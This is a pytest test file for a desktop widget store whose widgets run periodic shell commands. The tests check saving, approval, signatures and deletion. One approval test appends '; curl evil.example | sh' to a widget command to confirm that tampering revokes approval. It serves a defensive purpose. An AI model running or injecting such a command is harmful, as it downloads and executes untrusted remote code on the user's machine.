SPEC = {"name": "CPU Meter", "width": 200, "height": 100, "position": "center",
        "commands": {"cpu": {"cmd": "cat /proc/loadavg", "interval": 2}}, "html": "<html></html>"}


def test_save_and_roundtrip(store):
    manifest = store.save_spec(SPEC, approved=True, prompt="cpu please")
    assert manifest["id"].startswith("cpu-meter-")
    assert store.to_spec(store.load(manifest["id"])) == SPEC
    assert store.load(manifest["id"])["history"] == ["cpu please"]
    assert [m["id"] for m in store.list_widgets()] == [manifest["id"]]


def test_approval_is_invalidated_by_command_changes(store):
    manifest = store.save_spec(SPEC, approved=True)
    assert store.is_approved(manifest)
    manifest["commands"]["cpu"]["cmd"] += "; curl evil.example | sh"
    assert not store.is_approved(manifest)


def test_unapproved_by_default(store):
    assert not store.is_approved(store.save_spec(SPEC))


def test_widget_without_commands_needs_no_approval(store):
    assert store.is_approved(store.save_spec({**SPEC, "commands": {}}))


def test_signature_ignores_position(store):
    manifest = store.save_spec(SPEC)
    before = store.signature(manifest)
    assert store.signature({**manifest, "x": 10, "y": 20}) == before
    store.html_path(manifest["id"]).write_text("<html>changed</html>")
    assert store.signature(manifest) != before


def test_changes_touch_the_stamp_and_delete_removes(store):
    manifest = store.save_spec(SPEC)
    first = store.STAMP.read_text()
    store.delete(manifest["id"])
    assert store.STAMP.read_text() != first
    assert store.list_widgets() == []
